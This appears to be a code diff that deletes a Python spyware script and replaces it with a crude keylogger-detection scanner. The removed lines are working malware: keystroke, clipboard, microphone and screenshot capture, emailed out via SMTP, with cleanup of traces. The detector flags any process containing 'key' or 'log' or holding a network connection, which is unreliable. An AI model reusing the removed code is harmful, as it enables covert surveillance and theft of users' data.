@@ -1,238 +1,181 @@
-# Libraries
-
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-from email.mime.base import MIMEBase
-from email import encoders
-import smtplib
-
-import socket
-import platform
-
-import win32clipboard
-
-from pynput.keyboard import Key, Listener
-
-import time
 import os
+import psutil
+import ctypes
+import logging
+import time
+from datetime import datetime
+from colorama import Fore, Style, init
 
-from scipy.io.wavfile import write
-import sounddevice as sd
+# Initialize colorama
+init(autoreset=True)
 
-from cryptography.fernet import Fernet
+# Logging setup
+logging.basicConfig(
+    filename="keylogger_detection.log",
+    level=logging.INFO,
+    format="%(asctime)s - %(levelname)s - %(message)s"
+)
 
-import getpass
-from requests import get
+# Constants
+WH_KEYBOARD_LL = 13
+KERNEL32 = ctypes.windll.kernel32
 
-from multiprocessing import Process, freeze_support
-from PIL import ImageGrab
+# Ask before killing a process
+def prompt_kill(pid, name):
+    try:
+        choice = input(Fore.YELLOW + f"[PROMPT] Kill process {name} (PID: {pid})? (y/n): ").strip().lower()
+        if choice == 'y':
+            proc = psutil.Process(pid)
+            proc.terminate()
+            logging.warning(f"Process terminated: {name} (PID: {pid})")
+            print(Fore.RED + f"[ACTION] Terminated {name} (PID: {pid})")
+        else:
+            logging.info(f"Process skipped: {name} (PID: {pid})")
+            print(Fore.CYAN + f"[INFO] Skipped {name} (PID: {pid})")
+    except (psutil.NoSuchProcess, psutil.AccessDenied):
+        print(Fore.YELLOW + f"[WARN] Could not terminate {name} (PID: {pid})")
 
-keys_information = "key_log.txt"
-system_information = "syseminfo.txt"
-clipboard_information = "clipboard.txt"
-audio_information = "audio.wav"
-screenshot_information = "screenshot.png"
-
-keys_information_e = "e_key_log.txt"
-system_information_e = "e_systeminfo.txt"
-clipboard_information_e = "e_clipboard.txt"
-
-microphone_time = 10
-time_iteration = 15
-number_of_iterations_end = 3
-
-email_address = " " # Enter disposable email here
-password = " " # Enter email password here
-
-username = getpass.getuser()
-
-toaddr = "mugilan110405@gmail.com " # Enter the email address you want to send your information to
-
-key = " " # Generate an encryption key from the Cryptography folder
-
-file_path = " " # Enter the file path you want your files to be saved to
-extend = "\\"
-file_merge = file_path + extend
-
-# email controls
-def send_email(filename, attachment, toaddr):
-
-    fromaddr = email_address
-
-    msg = MIMEMultipart()
-
-    msg['From'] = fromaddr
-
-    msg['To'] = toaddr
-
-    msg['Subject'] = "Log File"
-
-    body = "Body_of_the_mail"
-
-    msg.attach(MIMEText(body, 'plain'))
-
-    filename = filename
-    attachment = open(attachment, 'rb')
-
-    p = MIMEBase('application', 'octet-stream')
-
-    p.set_payload((attachment).read())
-
-    encoders.encode_base64(p)
-
-    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
-
-    msg.attach(p)
-
-    s = smtplib.SMTP('smtp.gmail.com', 587)
-
-    s.starttls()
-
-    s.login(fromaddr, password)
-
-    text = msg.as_string()
-
-    s.sendmail(fromaddr, toaddr, text)
-
-    s.quit()
-
-send_email(keys_information, file_path + extend + keys_information, toaddr)
-
-# get the computer information
-def computer_information():
-    with open(file_path + extend + system_information, "a") as f:
-        hostname = socket.gethostname()
-        IPAddr = socket.gethostbyname(hostname)
+# Fixed Hook Detection
+def detect_hooks():
+    suspicious_dlls = ["hook.dll", "keyhook.dll", "keyboardhook.dll"]
+    detected = False
+    print(Fore.CYAN + "[INFO] Checking for suspicious hook DLLs...")
+    for proc in psutil.process_iter(['pid', 'name']):
         try:
-            public_ip = get("https://api.ipify.org").text
-            f.write("Public IP Address: " + public_ip)
+            for mmap in proc.memory_maps():
+                if any(s in mmap.path.lower() for s in suspicious_dlls):
+                    msg = f"[!] Possible hook DLL detected in {proc.info['name']} (PID: {proc.info['pid']})"
+                    print(Fore.RED + msg)
+                    logging.warning(msg)
+                    detected = True
+                    prompt_kill(proc.info['pid'], proc.info['name'])
+        except (psutil.NoSuchProcess, psutil.AccessDenied):
+            continue
+    if not detected:
+        print(Fore.GREEN + "[OK] No suspicious hook DLLs found.")
+    return detected
 
-        except Exception:
-            f.write("Couldn't get Public IP Address (most likely max query")
+# Process & DLL listing
+def list_processes_and_dlls():
+    suspicious_keywords = ["keylog", "hook", "log", "key"]
+    print(Fore.CYAN + "[INFO] Scanning processes and DLLs...")
 
-        f.write("Processor: " + (platform.processor()) + '\n')
-        f.write("System: " + platform.system() + " " + platform.version() + '\n')
-        f.write("Machine: " + platform.machine() + "\n")
-        f.write("Hostname: " + hostname + "\n")
-        f.write("Private IP Address: " + IPAddr + "\n")
+    for proc in psutil.process_iter(['pid', 'name', 'exe']):
+        pid = proc.info['pid']
+        name = proc.info.get('name', '')
+        exe = proc.info.get('exe', '')
 
-computer_information()
+        if pid in (0, 4):
+            continue
 
-# get the clipboard contents
-def copy_clipboard():
-    with open(file_path + extend + clipboard_information, "a") as f:
         try:
-            win32clipboard.OpenClipboard()
-            pasted_data = win32clipboard.GetClipboardData()
-            win32clipboard.CloseClipboard()
+            found = False
+            if any(k in (name or "").lower() for k in suspicious_keywords) or \
+               any(k in (exe or "").lower() for k in suspicious_keywords):
+                found = True
+                msg = f"[!] Suspicious process: {name} (PID: {pid}) Path: {exe}"
+                print(Fore.YELLOW + msg)
+                logging.warning(msg)
+                prompt_kill(pid, name)
 
-            f.write("Clipboard Data: \n" + pasted_data)
+            for dll in proc.memory_maps():
+                dll_path = dll.path or ""
+                if any(k in dll_path.lower() for k in suspicious_keywords):
+                    found = True
+                    msg = f"[!] Suspicious DLL: {dll_path} in Process: {name} (PID: {pid})"
+                    print(Fore.YELLOW + msg)
+                    logging.warning(msg)
+                    prompt_kill(pid, name)
 
-        except:
-            f.write("Clipboard could be not be copied")
+            if not found:
+                print(Fore.GREEN + f"[OK] {name} (PID: {pid}) seems clean.")
 
-copy_clipboard()
+        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess, OSError):
+            continue
 
-# get the microphone
-def microphone():
-    fs = 44100
-    seconds = microphone_time
+# Python keylogger detection
+def detect_python_keyloggers():
+    print(Fore.CYAN + "[INFO] Scanning for Python-based keyloggers...")
+    suspicious_modules = ["pynput", "keyboard", "pyxhook", "keylogger", "pynhook"]
+    detected = False
 
-    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
-    sd.wait()
+    for proc in psutil.process_iter(['pid', 'name', 'exe', 'cmdline']):
+        try:
+            name = (proc.info.get('name') or "").lower()
+            cmdline = " ".join(proc.info.get('cmdline') or []).lower()
 
-    write(file_path + extend + audio_information, fs, myrecording)
+            if "python" in name or "python" in cmdline:
+                if any(mod in cmdline for mod in suspicious_modules):
+                    msg = f"[!] Suspicious Python keylogger detected: {name} (PID: {proc.info['pid']}) CMD: {cmdline}"
+                    print(Fore.RED + msg)
+                    logging.warning(msg)
+                    detected = True
+                    prompt_kill(proc.info['pid'], name)
+                else:
+                    for mmap in proc.memory_maps():
+                        if any(mod in mmap.path.lower() for mod in suspicious_modules):
+                            msg = f"[!] Suspicious Python module in {name} (PID: {proc.info['pid']}): {mmap.path}"
+                            print(Fore.RED + msg)
+                            logging.warning(msg)
+                            detected = True
+                            prompt_kill(proc.info['pid'], name)
 
-# get screenshots
-def screenshot():
-    im = ImageGrab.grab()
-    im.save(file_path + extend + screenshot_information)
+        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess, OSError):
+            continue
 
-screenshot()
+    if not detected:
+        print(Fore.GREEN + "[OK] No Python-based keyloggers found.")
+    return detected
 
+# Fake event generation (HoneyID simulation)
+def honeyid_simulation():
+    try:
+        for i in range(3):
+            bogus_key = chr(65 + i)
+            msg = f"[HoneyID] Generated bogus key event: {bogus_key}"
+            print(Fore.MAGENTA + msg)
+            logging.info(msg)
+            time.sleep(0.5)
+    except Exception as e:
+        logging.error(f"Error in honeyid_simulation: {e}")
 
-number_of_iterations = 0
-currentTime = time.time()
-stoppingTime = time.time() + time_iteration
+# Behavior analysis
+def detect_suspicious_behavior():
+    print(Fore.CYAN + "[INFO] Analyzing process behavior...")
+    for proc in psutil.process_iter(['pid', 'name']):
+        pid = proc.info['pid']
+        name = proc.info.get('name', '')
 
-# Timer for keylogger
-while number_of_iterations < number_of_iterations_end:
+        if pid in (0, 4):
+            continue
 
-    count = 0
-    keys =[]
+        try:
+            for conn in proc.net_connections(kind='inet'):
+                if conn.status == psutil.CONN_ESTABLISHED:
+                    msg = f"[!] Process {name} (PID: {pid}) has an established network connection."
+                    print(Fore.RED + msg)
+                    logging.warning(msg)
+                    prompt_kill(pid, name)
 
-    def on_press(key):
-        global keys, count, currentTime
+            for mmap in proc.memory_maps():
+                if 'log' in mmap.path.lower():
+                    msg = f"[!] Suspicious log file in {name} (PID: {pid}): {mmap.path}"
+                    print(Fore.RED + msg)
+                    logging.warning(msg)
+                    prompt_kill(pid, name)
 
-        print(key)
-        keys.append(key)
-        count += 1
-        currentTime = time.time()
+        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess, OSError):
+            continue
 
-        if count >= 1:
-            count = 0
-            write_file(keys)
-            keys =[]
+# Main single-run
+if __name__ == "__main__":
+    print(Fore.CYAN + "=== Advanced Keylogger Detection System ===")
+    logging.info("Starting detection system...")
 
-    def write_file(keys):
-        with open(file_path + extend + keys_information, "a") as f:
-            for key in keys:
-                k = str(key).replace("'", "")
-                if k.find("space") > 0:
-                    f.write('\n')
-                    f.close()
-                elif k.find("Key") == -1:
-                    f.write(k)
-                    f.close()
-
-    def on_release(key):
-        if key == Key.esc:
-            return False
-        if currentTime > stoppingTime:
-            return False
-
-    with Listener(on_press=on_press, on_release=on_release) as listener:
-        listener.join()
-
-    if currentTime > stoppingTime:
-
-        with open(file_path + extend + keys_information, "w") as f:
-            f.write(" ")
-
-        screenshot()
-        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)
-
-        copy_clipboard()
-
-        number_of_iterations += 1
-
-        currentTime = time.time()
-        stoppingTime = time.time() + time_iteration
-
-# Encrypt files
-files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
-encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]
-
-count = 0
-
-for encrypting_file in files_to_encrypt:
-
-    with open(files_to_encrypt[count], 'rb') as f:
-        data = f.read()
-
-    fernet = Fernet(key)
-    encrypted = fernet.encrypt(data)
-
-    with open(encrypted_file_names[count], 'wb') as f:
-        f.write(encrypted)
-
-    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
-    count += 1
-
-time.sleep(120)
-
-# Clean up our tracks and delete files
-delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
-for file in delete_files:
-    os.remove(file_merge + file)
-
+    print(Fore.CYAN + f"\n[SCAN START] ===== {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} =====")
+    detect_hooks()
+    list_processes_and_dlls()
+    detect_python_keyloggers()
+    honeyid_simulation()
+    detect_suspicious_behavior()
+    print(Fore.CYAN + "[SCAN END] =================================\n")
